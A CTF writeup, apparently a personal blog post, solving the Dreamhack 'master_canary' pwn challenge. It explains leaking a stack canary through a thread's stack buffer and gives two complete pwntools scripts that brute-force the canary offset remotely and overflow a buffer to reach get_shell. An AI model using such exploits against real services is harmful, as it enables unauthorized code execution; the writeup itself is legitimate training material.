+++
date = '2026-05-13'
draft = false
title = 'Dreamhack master_canary Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
이 문제는 서버에서 작동하고 있는 서비스(master_canary)의 바이너리와 소스 코드가 주어집니다.
카나리 값을 구해 실행 흐름을 조작해 셸을 획득하세요.
셸을 획득한 후 얻은 "flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.

---


```c
int main(int argc, char *argv[]) {
    size_t size = 0;
    pthread_t thread_t;
    int idx = 0;
    char leave_comment[32];

    initialize();

    while (1) {
        printf("1. Create thread\n");
        printf("2. Input\n");
        printf("3. Exit\n");
        printf("> ");
        scanf("%d", &idx);

        switch (idx) {
            case 1:
                if (pthread_create(&thread_t, NULL, thread_routine, NULL) < 0) {
                    perror("thread create error");
                    exit(0);
                }
                break;
            case 2:
                printf("Size: ");
                scanf("%lu", &size);

                printf("Data: ");
                read_bytes(global_buffer, size);

                printf("Data: %s", global_buffer);
                break;
            case 3:
                printf("Leave comment: ");
                read(0, leave_comment, 1024);
                return 0;
            default:
                printf("Nope\n");
                break;
        }
    }

    return 0;
}
```

## Identifying the vulnerabilities

So, we can create threads. Interesting. We also have a massive overflow of `leave_comment` and into the `global_buffer`.

There's also a `get_shell` function, and this weird `thread_routine`:

```c
void *thread_routine() {
    char buf[256];

    global_buffer = buf;
}
```

I breakpoint-ed at that exact line, to see what data is in `buf` at the moment it gets passed to global buffer. I was thinking we can overwrite all the null bytes up to an address, and then when `global_buffer` is printed we'll see it.

```bash
pwndbg> x/50gx 0x7f1553744d90
0x7f1553744d90: 0x0000000000000000      0x0000000000000000
0x7f1553744da0: 0x0000000000000000      0x0000000000097620
0x7f1553744db0: 0x00007f15537456c0      0x00007ffc749902e7
0x7f1553744dc0: 0x0000000000000000      0x0000000000000000
0x7f1553744dd0: 0x0000000000000000      0x0000000000000000
0x7f1553744de0: 0x0000000000000000      0x0000000000000000
0x7f1553744df0: 0x0000000000000000      0x0000000000000000
0x7f1553744e00: 0x0000000000000000      0x00007f155385d5f1
0x7f1553744e10: 0x0000000000000000      0x5e13e34660140200
```

Looks like it is - those are some thread stack addresses, the ones that look like libc, and that's the canary (the last one). I created two threads and leaked both libc and the canary, because at some point doing this I completely forgot that we had a win function.

Anyways, after you count the bytes up to the canary's null byte and send the payload, you get the leak. And all thread use the same canary, so we can use that anywhere. 

Then, we just need to create the last payload for the buffer overflow in *comment* and then get the flag. 

---

Except, remotely, of course the canary is at a different offset. I thought I found it, because it was a random canary-looking value like `0x60fd87497505e900`, and I just couldn't find what the hell was wrong with my script. And I got too annoyed to keep testing offsets, so I made a bruteforce with threads. And I got back:

```bash
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB'
found canary 0x0
[+] Opening connection to host8.dreamhack.games on port 20197: Done
[*] Closed connection to host8.dreamhack.games port 20197
FOUND FLAG AT OFFSET 2281
```

Here was that script:

```python
from pwn import *
from concurrent.futures import ThreadPoolExecutor

elf = ELF('/home/kali/Downloads/dreamhack/master_canary/master_canary')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:20197'

ip, port = cyberedu.split(':')
port = int(port)

#if args.REMOTE:
#    p = remote(ip, port)
#else:
#    p = elf.process()


def create_thread(p):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    
def send_input(p, size, data):
    p.recvuntil(b"> ")
    p.sendline(b"2")
    
    p.recvuntil(b": ")
    p.sendline(size)
    
    p.recvuntil(b": ")
    p.sendline(data)
    
    p.recvuntil(b": ")
    printed = p.recvuntil(b"1.", drop=True)
    print(f"data printed was {printed}")
    return printed
    
def exit(p, comment):
    p.recvuntil(b"> ")
    p.sendline(b"3")
    
    p.recvuntil(b": ")
    p.sendline(comment)
    

getshell = 0x400a4b

def find_canary(j):

    i = 8 * j + 1
    
    try:
        p = remote(ip, port)
        create_thread(p)
        
        canary_leak = send_input(p, str(i), b"A"*(i-1) + b"B")
        garbage, canary_bytes = canary_leak.split(b"B")
        canary_bytes = canary_bytes[0:7]
        canary = u64(canary_bytes.rjust(8, b"\x00"))
    
        print(f"found canary {hex(canary)}")
        if canary == 0x0:
            return
            
        payload = (b"A" * 40 +
                   p64(canary) +
                   b"B"*8 +
                   p64(getshell)
                  )
                      
        exit(p, payload)
        p.sendline(b"ls")
        sleep(1)
            
        if b'flag' in p.recvall():
            print(f"FOUND FLAG AT OFFSET {i}")
            p.sendline(b"cat flag")
            p.interactive()
            
    except:
        pass
    
with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(find_canary, range(0, 500))
```

And here is the script to actually print the flag:

```python
from pwn import *
from concurrent.futures import ThreadPoolExecutor

elf = ELF('/home/kali/Downloads/dreamhack/master_canary/master_canary')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:20197'

ip, port = cyberedu.split(':')
port = int(port)

#if args.REMOTE:
#    p = remote(ip, port)
#else:
#    p = elf.process()


def create_thread(p):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    
def send_input(p, size, data):
    p.recvuntil(b"> ")
    p.sendline(b"2")
    
    p.recvuntil(b": ")
    p.sendline(size)
    
    p.recvuntil(b": ")
    p.sendline(data)
    
    p.recvuntil(b": ")
    printed = p.recvuntil(b"1.", drop=True)
    print(f"data printed was {printed}")
    return printed
    
def exit(p, comment):
    p.recvuntil(b"> ")
    p.sendline(b"3")
    
    p.recvuntil(b": ")
    p.sendline(comment)
    

getshell = 0x400a4b

def find_canary(j):

    #i = 8 * j + 1
    i = 2281
    
    try:
        p = remote(ip, port)
        create_thread(p)
        
        canary_leak = send_input(p, str(i), b"A"*(i-1) + b"B")
        garbage, canary_bytes = canary_leak.split(b"B")
        canary_bytes = canary_bytes[0:7]
        canary = u64(canary_bytes.rjust(8, b"\x00"))
    
        print(f"found canary {hex(canary)}")
        if canary == 0x0:
            return
            
        payload = (b"A" * 40 +
                   p64(canary) +
                   b"B"*8 +
                   p64(getshell)
                  )
                      
        exit(p, payload)
        p.sendline(b"ls")
        p.interactive()
                   
    except:
        pass
    
#with ThreadPoolExecutor(max_workers=10) as executor:
#    executor.map(find_canary, range(0, 500))

find_canary(0)
```

With the amount of time I tested bad offsets automating it from the start would've saved me about an hour and a half.

![challenge-screenshot](flag.png#center)


---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/master_canary.py)**.
